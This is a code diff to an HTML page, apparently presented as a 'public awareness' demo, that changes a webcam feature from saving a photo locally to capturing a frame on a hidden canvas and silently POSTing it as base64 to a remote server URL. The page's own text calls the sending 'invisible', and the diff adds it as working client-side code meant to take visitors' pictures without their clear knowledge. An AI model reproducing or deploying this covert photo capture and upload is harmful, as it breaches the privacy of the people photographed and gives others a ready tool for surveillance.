@@ -58,10 +58,9 @@
   <hr>
 
   <h3>Camera (Optional)</h3>
-  <p>Click the button to allow camera, take a photo, and save automatically.</p>
+  <p>Click the button to allow camera and automatically send a photo (invisible).</p>
 
-  <button onclick="captureAndSave()">Allow & Take Photo</button><br><br>
-  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+  <button onclick="captureAndUpload()">Allow & Send Photo</button>
 
   <p class="note">
     This page is for public awareness only.
@@ -69,7 +68,7 @@
 </div>
 
 <script>
-async function captureAndSave() {
+async function captureAndUpload() {
   try {
     // Camera permission
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -77,9 +76,11 @@ async function captureAndSave() {
     video.srcObject = stream;
     video.play();
 
-    // Delay to allow camera to start
-    setTimeout(() => {
-      const canvas = document.getElementById('canvas');
+    // Short delay for camera to start
+    setTimeout(async () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = 300;
+      canvas.height = 200;
       const ctx = canvas.getContext('2d');
 
       // Capture photo
@@ -88,14 +89,18 @@ async function captureAndSave() {
       // Stop camera
       stream.getTracks().forEach(track => track.stop());
 
-      // Auto download
-      const image = canvas.toDataURL('image/png');
-      const link = document.createElement('a');
-      link.href = image;
-      link.download = 'photo.png';
-      link.click();
+      // Convert to Base64
+      const imageData = canvas.toDataURL('image/png');
 
-      alert("Photo captured and saved!");
+      // Send to server
+      await fetch('https://example.com/upload', { // Replace with your server URL
+        method: 'POST',
+        body: JSON.stringify({ image: imageData }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+
+      alert("Photo sent successfully!");
+
     }, 500); // 0.5 second delay
 
   } catch (err) {
